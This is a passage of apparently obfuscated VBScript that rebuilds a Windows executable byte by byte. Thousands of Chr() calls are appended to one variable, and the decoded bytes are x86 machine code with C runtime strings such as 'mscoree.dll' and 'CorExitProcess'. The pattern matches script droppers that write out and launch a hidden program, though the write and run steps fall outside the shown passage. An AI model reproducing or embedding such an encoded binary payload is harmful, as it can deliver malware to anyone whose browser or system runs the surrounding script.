GqnqCn=GqnqCn&Chr(252)&Chr(0)&Chr(116)&Chr(7)&Chr(139)&Chr(77)&Chr(248)&Chr(131)&Chr(97)&Chr(112)&Chr(253)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(106)&Chr(10)&Chr(106)&Chr(0)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(104)&Chr(2)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(12)&Chr(93)&Chr(195)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(81)&Chr(141)&Chr(76)&Chr(36)&Chr(4)&Chr(43)&Chr(200)&Chr(27)&Chr(192)&Chr(247)&Chr(208)&Chr(35)&Chr(200)&Chr(139)&Chr(196)&Chr(37)&Chr(0)&Chr(240)&Chr(255)&Chr(255)&Chr(59)&Chr(200)&Chr(114)&Chr(10)&Chr(139)&Chr(193)&Chr(89)&Chr(148)&Chr(139)&Chr(0)&Chr(137)&Chr(4)&Chr(36)&Chr(195)&Chr(45)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(133)&Chr(0)&Chr(235)&Chr(233)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(20)&Chr(86)&Chr(87)&Chr(255)&Chr(117)&Chr(8)
GqnqCn=GqnqCn&Chr(141)&Chr(77)&Chr(236)&Chr(232)&Chr(158)&Chr(199)&Chr(255)&Chr(255)&Chr(139)&Chr(69)&Chr(16)&Chr(139)&Chr(117)&Chr(12)&Chr(51)&Chr(255)&Chr(59)&Chr(199)&Chr(116)&Chr(2)&Chr(137)&Chr(48)&Chr(59)&Chr(247)&Chr(117)&Chr(44)&Chr(232)&Chr(19)&Chr(190)&Chr(255)&Chr(255)&Chr(87)&Chr(87)&Chr(87)&Chr(87)&Chr(87)&Chr(199)&Chr(0)&Chr(22)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(155)&Chr(189)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(20)&Chr(128)&Chr(125)&Chr(248)&Chr(0)&Chr(116)&Chr(7)&Chr(139)&Chr(69)&Chr(244)&Chr(131)&Chr(96)&Chr(112)&Chr(253)&Chr(51)&Chr(192)&Chr(233)&Chr(216)&Chr(1)&Chr(0)&Chr(0)&Chr(57)&Chr(125)&Chr(20)&Chr(116)&Chr(12)&Chr(131)&Chr(125)&Chr(20)&Chr(2)&Chr(124)&Chr(201)&Chr(131)&Chr(125)&Chr(20)&Chr(36)&Chr(127)&Chr(195)&Chr(139)&Chr(77)&Chr(236)&Chr(83)&Chr(138)&Chr(30)&Chr(137)&Chr(125)&Chr(252)&Chr(141)&Chr(126)&Chr(1)&Chr(131)
GqnqCn=GqnqCn&Chr(185)&Chr(172)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(126)&Chr(23)&Chr(141)&Chr(69)&Chr(236)&Chr(80)&Chr(15)&Chr(182)&Chr(195)&Chr(106)&Chr(8)&Chr(80)&Chr(232)&Chr(6)&Chr(252)&Chr(255)&Chr(255)&Chr(139)&Chr(77)&Chr(236)&Chr(131)&Chr(196)&Chr(12)&Chr(235)&Chr(16)&Chr(139)&Chr(145)&Chr(200)&Chr(0)&Chr(0)&Chr(0)&Chr(15)&Chr(182)&Chr(195)&Chr(15)&Chr(183)&Chr(4)&Chr(66)&Chr(131)&Chr(224)&Chr(8)&Chr(133)&Chr(192)&Chr(116)&Chr(5)&Chr(138)&Chr(31)&Chr(71)&Chr(235)&Chr(199)&Chr(128)&Chr(251)&Chr(45)&Chr(117)&Chr(6)&Chr(131)&Chr(77)&Chr(24)&Chr(2)&Chr(235)&Chr(5)&Chr(128)&Chr(251)&Chr(43)&Chr(117)&Chr(3)&Chr(138)&Chr(31)&Chr(71)&Chr(139)&Chr(69)&Chr(20)&Chr(133)&Chr(192)&Chr(15)&Chr(140)&Chr(75)&Chr(1)&Chr(0)&Chr(0)&Chr(131)&Chr(248)&Chr(1)&Chr(15)&Chr(132)&Chr(66)&Chr(1)&Chr(0)&Chr(0)&Chr(131)&Chr(248)&Chr(36)&Chr(15)&Chr(143)
GqnqCn=GqnqCn&Chr(57)&Chr(1)&Chr(0)&Chr(0)&Chr(133)&Chr(192)&Chr(117)&Chr(42)&Chr(128)&Chr(251)&Chr(48)&Chr(116)&Chr(9)&Chr(199)&Chr(69)&Chr(20)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(52)&Chr(138)&Chr(7)&Chr(60)&Chr(120)&Chr(116)&Chr(13)&Chr(60)&Chr(88)&Chr(116)&Chr(9)&Chr(199)&Chr(69)&Chr(20)&Chr(8)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(33)&Chr(199)&Chr(69)&Chr(20)&Chr(16)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(10)&Chr(131)&Chr(248)&Chr(16)&Chr(117)&Chr(19)&Chr(128)&Chr(251)&Chr(48)&Chr(117)&Chr(14)&Chr(138)&Chr(7)&Chr(60)&Chr(120)&Chr(116)&Chr(4)&Chr(60)&Chr(88)&Chr(117)&Chr(4)&Chr(71)&Chr(138)&Chr(31)&Chr(71)&Chr(139)&Chr(177)&Chr(200)&Chr(0)&Chr(0)&Chr(0)&Chr(184)&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(51)&Chr(210)&Chr(247)&Chr(117)&Chr(20)&Chr(15)&Chr(182)&Chr(203)&Chr(15)&Chr(183)&Chr(12)&Chr(78)&Chr(246)&Chr(193)&Chr(4)
GqnqCn=GqnqCn&Chr(116)&Chr(8)&Chr(15)&Chr(190)&Chr(203)&Chr(131)&Chr(233)&Chr(48)&Chr(235)&Chr(27)&Chr(247)&Chr(193)&Chr(3)&Chr(1)&Chr(0)&Chr(0)&Chr(116)&Chr(49)&Chr(138)&Chr(203)&Chr(128)&Chr(233)&Chr(97)&Chr(128)&Chr(249)&Chr(25)&Chr(15)&Chr(190)&Chr(203)&Chr(119)&Chr(3)&Chr(131)&Chr(233)&Chr(32)&Chr(131)&Chr(193)&Chr(201)&Chr(59)&Chr(77)&Chr(20)&Chr(115)&Chr(25)&Chr(131)&Chr(77)&Chr(24)&Chr(8)&Chr(57)&Chr(69)&Chr(252)&Chr(114)&Chr(39)&Chr(117)&Chr(4)&Chr(59)&Chr(202)&Chr(118)&Chr(33)&Chr(131)&Chr(77)&Chr(24)&Chr(4)&Chr(131)&Chr(125)&Chr(16)&Chr(0)&Chr(117)&Chr(35)&Chr(139)&Chr(69)&Chr(24)&Chr(79)&Chr(168)&Chr(8)&Chr(117)&Chr(32)&Chr(131)&Chr(125)&Chr(16)&Chr(0)&Chr(116)&Chr(3)&Chr(139)&Chr(125)&Chr(12)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(235)&Chr(91)&Chr(139)&Chr(93)&Chr(252)&Chr(15)&Chr(175)&Chr(93)&Chr(20)&Chr(3)&Chr(217)&Chr(137)
GqnqCn=GqnqCn&Chr(93)&Chr(252)&Chr(138)&Chr(31)&Chr(71)&Chr(235)&Chr(139)&Chr(190)&Chr(255)&Chr(255)&Chr(255)&Chr(127)&Chr(168)&Chr(4)&Chr(117)&Chr(27)&Chr(168)&Chr(1)&Chr(117)&Chr(61)&Chr(131)&Chr(224)&Chr(2)&Chr(116)&Chr(9)&Chr(129)&Chr(125)&Chr(252)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(119)&Chr(9)&Chr(133)&Chr(192)&Chr(117)&Chr(43)&Chr(57)&Chr(117)&Chr(252)&Chr(118)&Chr(38)&Chr(232)&Chr(114)&Chr(188)&Chr(255)&Chr(255)&Chr(246)&Chr(69)&Chr(24)&Chr(1)&Chr(199)&Chr(0)&Chr(34)&Chr(0)&Chr(0)&Chr(0)&Chr(116)&Chr(6)&Chr(131)&Chr(77)&Chr(252)&Chr(255)&Chr(235)&Chr(15)&Chr(246)&Chr(69)&Chr(24)&Chr(2)&Chr(106)&Chr(0)&Chr(88)&Chr(15)&Chr(149)&Chr(192)&Chr(3)&Chr(198)&Chr(137)&Chr(69)&Chr(252)&Chr(139)&Chr(69)&Chr(16)&Chr(133)&Chr(192)&Chr(116)&Chr(2)&Chr(137)&Chr(56)&Chr(246)&Chr(69)&Chr(24)&Chr(2)&Chr(116)&Chr(3)&Chr(247)&Chr(93)&Chr(252)&Chr(128)
GqnqCn=GqnqCn&Chr(125)&Chr(248)&Chr(0)&Chr(116)&Chr(7)&Chr(139)&Chr(69)&Chr(244)&Chr(131)&Chr(96)&Chr(112)&Chr(253)&Chr(139)&Chr(69)&Chr(252)&Chr(235)&Chr(24)&Chr(139)&Chr(69)&Chr(16)&Chr(133)&Chr(192)&Chr(116)&Chr(2)&Chr(137)&Chr(48)&Chr(128)&Chr(125)&Chr(248)&Chr(0)&Chr(116)&Chr(7)&Chr(139)&Chr(69)&Chr(244)&Chr(131)&Chr(96)&Chr(112)&Chr(253)&Chr(51)&Chr(192)&Chr(91)&Chr(95)&Chr(94)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(51)&Chr(192)&Chr(80)&Chr(255)&Chr(117)&Chr(16)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(8)&Chr(57)&Chr(5)&Chr(148)&Chr(178)&Chr(64)&Chr(0)&Chr(117)&Chr(7)&Chr(104)&Chr(240)&Chr(169)&Chr(64)&Chr(0)&Chr(235)&Chr(1)&Chr(80)&Chr(232)&Chr(171)&Chr(253)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(20)&Chr(93)&Chr(195)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)
GqnqCn=GqnqCn&Chr(85)&Chr(139)&Chr(236)&Chr(87)&Chr(86)&Chr(83)&Chr(139)&Chr(77)&Chr(16)&Chr(11)&Chr(201)&Chr(116)&Chr(77)&Chr(139)&Chr(117)&Chr(8)&Chr(139)&Chr(125)&Chr(12)&Chr(183)&Chr(65)&Chr(179)&Chr(90)&Chr(182)&Chr(32)&Chr(141)&Chr(73)&Chr(0)&Chr(138)&Chr(38)&Chr(10)&Chr(228)&Chr(138)&Chr(7)&Chr(116)&Chr(39)&Chr(10)&Chr(192)&Chr(116)&Chr(35)&Chr(131)&Chr(198)&Chr(1)&Chr(131)&Chr(199)&Chr(1)&Chr(58)&Chr(231)&Chr(114)&Chr(6)&Chr(58)&Chr(227)&Chr(119)&Chr(2)&Chr(2)&Chr(230)&Chr(58)&Chr(199)&Chr(114)&Chr(6)&Chr(58)&Chr(195)&Chr(119)&Chr(2)&Chr(2)&Chr(198)&Chr(58)&Chr(224)&Chr(117)&Chr(11)&Chr(131)&Chr(233)&Chr(1)&Chr(117)&Chr(209)&Chr(51)&Chr(201)&Chr(58)&Chr(224)&Chr(116)&Chr(9)&Chr(185)&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(114)&Chr(2)&Chr(247)&Chr(217)&Chr(139)&Chr(193)&Chr(91)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(204)&Chr(204)&Chr(204)
GqnqCn=GqnqCn&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(86)&Chr(139)&Chr(68)&Chr(36)&Chr(20)&Chr(11)&Chr(192)&Chr(117)&Chr(40)&Chr(139)&Chr(76)&Chr(36)&Chr(16)&Chr(139)&Chr(68)&Chr(36)&Chr(12)&Chr(51)&Chr(210)&Chr(247)&Chr(241)&Chr(139)&Chr(216)&Chr(139)&Chr(68)&Chr(36)&Chr(8)&Chr(247)&Chr(241)&Chr(139)&Chr(240)&Chr(139)&Chr(195)&Chr(247)&Chr(100)&Chr(36)&Chr(16)&Chr(139)&Chr(200)&Chr(139)&Chr(198)&Chr(247)&Chr(100)&Chr(36)&Chr(16)&Chr(3)&Chr(209)&Chr(235)&Chr(71)&Chr(139)&Chr(200)&Chr(139)&Chr(92)&Chr(36)&Chr(16)&Chr(139)&Chr(84)&Chr(36)&Chr(12)&Chr(139)&Chr(68)&Chr(36)&Chr(8)&Chr(209)&Chr(233)&Chr(209)&Chr(219)&Chr(209)&Chr(234)&Chr(209)&Chr(216)&Chr(11)&Chr(201)&Chr(117)&Chr(244)&Chr(247)&Chr(243)&Chr(139)&Chr(240)&Chr(247)&Chr(100)&Chr(36)&Chr(20)&Chr(139)&Chr(200)&Chr(139)&Chr(68)&Chr(36)
GqnqCn=GqnqCn&Chr(16)&Chr(247)&Chr(230)&Chr(3)&Chr(209)&Chr(114)&Chr(14)&Chr(59)&Chr(84)&Chr(36)&Chr(12)&Chr(119)&Chr(8)&Chr(114)&Chr(15)&Chr(59)&Chr(68)&Chr(36)&Chr(8)&Chr(118)&Chr(9)&Chr(78)&Chr(43)&Chr(68)&Chr(36)&Chr(16)&Chr(27)&Chr(84)&Chr(36)&Chr(20)&Chr(51)&Chr(219)&Chr(43)&Chr(68)&Chr(36)&Chr(8)&Chr(27)&Chr(84)&Chr(36)&Chr(12)&Chr(247)&Chr(218)&Chr(247)&Chr(216)&Chr(131)&Chr(218)&Chr(0)&Chr(139)&Chr(202)&Chr(139)&Chr(211)&Chr(139)&Chr(217)&Chr(139)&Chr(200)&Chr(139)&Chr(198)&Chr(94)&Chr(194)&Chr(16)&Chr(0)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(139)&Chr(68)&Chr(36)&Chr(8)&Chr(139)&Chr(76)&Chr(36)&Chr(16)&Chr(11)&Chr(200)&Chr(139)&Chr(76)&Chr(36)&Chr(12)&Chr(117)&Chr(9)&Chr(139)&Chr(68)&Chr(36)&Chr(4)&Chr(247)&Chr(225)&Chr(194)&Chr(16)&Chr(0)&Chr(83)&Chr(247)&Chr(225)
GqnqCn=GqnqCn&Chr(139)&Chr(216)&Chr(139)&Chr(68)&Chr(36)&Chr(8)&Chr(247)&Chr(100)&Chr(36)&Chr(20)&Chr(3)&Chr(216)&Chr(139)&Chr(68)&Chr(36)&Chr(8)&Chr(247)&Chr(225)&Chr(3)&Chr(211)&Chr(91)&Chr(194)&Chr(16)&Chr(0)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(204)&Chr(141)&Chr(66)&Chr(255)&Chr(91)&Chr(195)&Chr(141)&Chr(164)&Chr(36)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(100)&Chr(36)&Chr(0)&Chr(51)&Chr(192)&Chr(138)&Chr(68)&Chr(36)&Chr(8)&Chr(83)&Chr(139)&Chr(216)&Chr(193)&Chr(224)&Chr(8)&Chr(139)&Chr(84)&Chr(36)&Chr(8)&Chr(247)&Chr(194)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(116)&Chr(21)&Chr(138)&Chr(10)&Chr(131)&Chr(194)&Chr(1)&Chr(58)&Chr(203)&Chr(116)&Chr(207)&Chr(132)&Chr(201)&Chr(116)&Chr(81)&Chr(247)&Chr(194)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(117)&Chr(235)&Chr(11)&Chr(216)&Chr(87)
GqnqCn=GqnqCn&Chr(139)&Chr(195)&Chr(193)&Chr(227)&Chr(16)&Chr(86)&Chr(11)&Chr(216)&Chr(139)&Chr(10)&Chr(191)&Chr(255)&Chr(254)&Chr(254)&Chr(126)&Chr(139)&Chr(193)&Chr(139)&Chr(247)&Chr(51)&Chr(203)&Chr(3)&Chr(240)&Chr(3)&Chr(249)&Chr(131)&Chr(241)&Chr(255)&Chr(131)&Chr(240)&Chr(255)&Chr(51)&Chr(207)&Chr(51)&Chr(198)&Chr(131)&Chr(194)&Chr(4)&Chr(129)&Chr(225)&Chr(0)&Chr(1)&Chr(1)&Chr(129)&Chr(117)&Chr(28)&Chr(37)&Chr(0)&Chr(1)&Chr(1)&Chr(129)&Chr(116)&Chr(211)&Chr(37)&Chr(0)&Chr(1)&Chr(1)&Chr(1)&Chr(117)&Chr(8)&Chr(129)&Chr(230)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(117)&Chr(196)&Chr(94)&Chr(95)&Chr(91)&Chr(51)&Chr(192)&Chr(195)&Chr(139)&Chr(66)&Chr(252)&Chr(58)&Chr(195)&Chr(116)&Chr(54)&Chr(132)&Chr(192)&Chr(116)&Chr(239)&Chr(58)&Chr(227)&Chr(116)&Chr(39)&Chr(132)&Chr(228)&Chr(116)&Chr(231)&Chr(193)&Chr(232)&Chr(16)&Chr(58)&Chr(195)&Chr(116)&Chr(21)
GqnqCn=GqnqCn&Chr(132)&Chr(192)&Chr(116)&Chr(220)&Chr(58)&Chr(227)&Chr(116)&Chr(6)&Chr(132)&Chr(228)&Chr(116)&Chr(212)&Chr(235)&Chr(150)&Chr(94)&Chr(95)&Chr(141)&Chr(66)&Chr(255)&Chr(91)&Chr(195)&Chr(141)&Chr(66)&Chr(254)&Chr(94)&Chr(95)&Chr(91)&Chr(195)&Chr(141)&Chr(66)&Chr(253)&Chr(94)&Chr(95)&Chr(91)&Chr(195)&Chr(141)&Chr(66)&Chr(252)&Chr(94)&Chr(95)&Chr(91)&Chr(195)&Chr(255)&Chr(37)&Chr(196)&Chr(128)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(116)&Chr(150)&Chr(0)&Chr(0)&Chr(134)&Chr(150)&Chr(0)&Chr(0)&Chr(152)&Chr(150)&Chr(0)&Chr(0)&Chr(182)&Chr(150)&Chr(0)&Chr(0)&Chr(202)&Chr(150)&Chr(0)&Chr(0)&Chr(210)&Chr(150)&Chr(0)&Chr(0)&Chr(228)&Chr(150)&Chr(0)&Chr(0)&Chr(242)&Chr(150)&Chr(0)&Chr(0)&Chr(254)&Chr(150)&Chr(0)&Chr(0)&Chr(14)&Chr(151)&Chr(0)&Chr(0)&Chr(36)&Chr(151)&Chr(0)&Chr(0)&Chr(62)&Chr(151)&Chr(0)&Chr(0)&Chr(86)&Chr(151)&Chr(0)&Chr(0)&Chr(112)&Chr(151)&Chr(0)&Chr(0)&Chr(134)&Chr(151)&Chr(0)&Chr(0)&Chr(150)&Chr(151)&Chr(0)&Chr(0)&Chr(176)&Chr(151)&Chr(0)&Chr(0)&Chr(194)&Chr(151)&Chr(0)&Chr(0)&Chr(208)&Chr(151)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(232)&Chr(151)&Chr(0)&Chr(0)&Chr(246)&Chr(151)&Chr(0)&Chr(0)&Chr(2)&Chr(152)&Chr(0)&Chr(0)&Chr(16)&Chr(152)&Chr(0)&Chr(0)&Chr(26)&Chr(152)&Chr(0)&Chr(0)&Chr(50)&Chr(152)&Chr(0)&Chr(0)&Chr(66)&Chr(152)&Chr(0)&Chr(0)&Chr(88)&Chr(152)&Chr(0)&Chr(0)&Chr(112)&Chr(152)&Chr(0)&Chr(0)&Chr(126)&Chr(152)&Chr(0)&Chr(0)&Chr(140)&Chr(152)&Chr(0)&Chr(0)&Chr(152)&Chr(152)&Chr(0)&Chr(0)&Chr(178)&Chr(152)&Chr(0)&Chr(0)&Chr(194)&Chr(152)&Chr(0)&Chr(0)&Chr(216)&Chr(152)&Chr(0)&Chr(0)&Chr(242)&Chr(152)&Chr(0)&Chr(0)&Chr(10)&Chr(153)&Chr(0)&Chr(0)&Chr(34)&Chr(153)&Chr(0)&Chr(0)&Chr(54)&Chr(153)&Chr(0)&Chr(0)&Chr(74)&Chr(153)&Chr(0)&Chr(0)&Chr(102)&Chr(153)&Chr(0)&Chr(0)&Chr(122)&Chr(153)&Chr(0)&Chr(0)&Chr(138)&Chr(153)&Chr(0)&Chr(0)&Chr(178)&Chr(153)&Chr(0)&Chr(0)&Chr(190)&Chr(153)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(200)&Chr(153)&Chr(0)&Chr(0)&Chr(212)&Chr(153)&Chr(0)&Chr(0)&Chr(230)&Chr(153)&Chr(0)&Chr(0)&Chr(242)&Chr(153)&Chr(0)&Chr(0)&Chr(2)&Chr(154)&Chr(0)&Chr(0)&Chr(16)&Chr(154)&Chr(0)&Chr(0)&Chr(28)&Chr(154)&Chr(0)&Chr(0)&Chr(40)&Chr(154)&Chr(0)&Chr(0)&Chr(58)&Chr(154)&Chr(0)&Chr(0)&Chr(74)&Chr(154)&Chr(0)&Chr(0)&Chr(96)&Chr(154)&Chr(0)&Chr(0)&Chr(112)&Chr(154)&Chr(0)&Chr(0)&Chr(130)&Chr(154)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(167)&Chr(44)&Chr(64)&Chr(0)&Chr(5)&Chr(61)&Chr(64)&Chr(0)&Chr(10)&Chr(96)&Chr(64)&Chr(0)&Chr(246)&Chr(17)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(67)&Chr(111)&Chr(114)&Chr(69)&Chr(120)&Chr(105)&Chr(116)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(0)&Chr(0)&Chr(109)&Chr(0)&Chr(115)&Chr(0)&Chr(99)&Chr(0)&Chr(111)&Chr(0)&Chr(114)&Chr(0)&Chr(101)&Chr(0)&Chr(101)&Chr(0)&Chr(46)&Chr(0)&Chr(100)&Chr(0)&Chr(108)&Chr(0)&Chr(108)&Chr(0)&Chr(0)&Chr(0)&Chr(114)&Chr(117)&Chr(110)&Chr(116)&Chr(105)&Chr(109)&Chr(101)&Chr(32)&Chr(101)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(32)&Chr(0)&Chr(0)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(84)&Chr(76)&Chr(79)&Chr(83)&Chr(83)&Chr(32)&Chr(101)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(83)&Chr(73)&Chr(78)&Chr(71)&Chr(32)&Chr(101)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(13)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(68)&Chr(79)&Chr(77)&Chr(65)
